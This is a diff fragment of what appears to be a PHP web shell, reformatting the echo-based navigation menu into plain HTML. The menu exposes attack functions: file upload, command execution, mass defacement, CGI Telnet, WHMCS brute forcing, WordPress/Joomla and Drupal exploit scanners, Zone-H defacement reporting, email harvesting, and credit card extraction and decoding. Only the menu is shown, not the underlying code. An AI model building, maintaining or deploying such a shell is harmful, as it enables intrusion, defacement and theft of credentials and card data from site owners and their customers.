@@ -72,11 +72,11 @@ body {
 		font: lime; } </style></head><body><div id="form-container"><div align="center" class="style2"><table width="100%" border="0">
 
 
-echo "<table width='100%' class='table_home' border='0' cellpadding='3' cellspacing='1' align='center'>
-		<tr>
-		<th class='th_home'>";
-echo "<ul>";
-echo "| <a href='?'><input class='button' type='button' value=Home></a>
+<table width='100%' class='table_home' border='0' cellpadding='3' cellspacing='1' align='center'>
+<tr>
+<th class='th_home'>
+<ul>
+| <a href='?'><input class='button' type='button' value=Home></a>
 | <a href='?dir=$dir&do=upload'><input class='button' type='button' value=Upload></a>
 | <a href='?dir=$dir&do=cmd'><input class='button' type='button' value=Command></a> 
 | <a href='?dir=$dir&do=mass_deface'><input class='button' type='button' value=Mass Deface></a> 
@@ -93,9 +93,9 @@ echo "| <a href='?'><input class='button' type='button' value=Home></a>
 |<a href='?dir=$dir&do=SwPJmPL'><input class='button' type='button' value=Scaner Plugin WP JM ></a>
 |<a href='?dir=$dir&do=Whmcz211'><input class='button' type='button' value=Brute Whmcs></a>
 |<a href='?dir=$dir&do=XdRpLs'><input class='button' type='button' value=Xmas-Drupal></a>
-|<a href='?dir=$dir&do=SloROkaN'><input class='button' type='button' value=Slorokan></a> ";
-
-echo "| <a href='?dir=$dir&do=zoneh'><input class='button' type='button' value=Zone-H></a> 
+|<a href='?dir=$dir&do=SloROkaN'><input class='button' type='button' value=Slorokan></a> 
+<br>
+| <a href='?dir=$dir&do=zoneh'><input class='button' type='button' value=Zone-H></a> 
 | <a href='?dir=$dir&do=SbN'><input class='button' type='button' value=Sabun></a> 
 | <a href='?dir=$dir&do=cgi'><input class='button' type='button' value=CGI Telnet></a> 
 | <a href='?dir=$dir&do=network'><input class='button' type='button' value=network></a> 
@@ -113,9 +113,9 @@ echo "| <a href='?dir=$dir&do=zoneh'><input class='button' type='button' value=Z
 |<a href='?dir=$dir&do=ExE'><input class='button' type='button' value=Email Extractor></a>
 |<a href='?dir=$dir&do=PmE'><input class='button' type='button' value=Pemisah Email></a>
 |<a href='?dir=$dir&do=ExTrPCc'><input class='button' type='button' value=Extrap CC></a>
-<a href='?dir=$dir&do=DdCc'><input class='button' type='button' value=Decode CC></a>| ";
-echo "</ul>";
-echo "</th></tr>";
+<a href='?dir=$dir&do=DdCc'><input class='button' type='button' value=Decode CC></a>| 
+</ul>
+</th></tr>
 
 		
 			
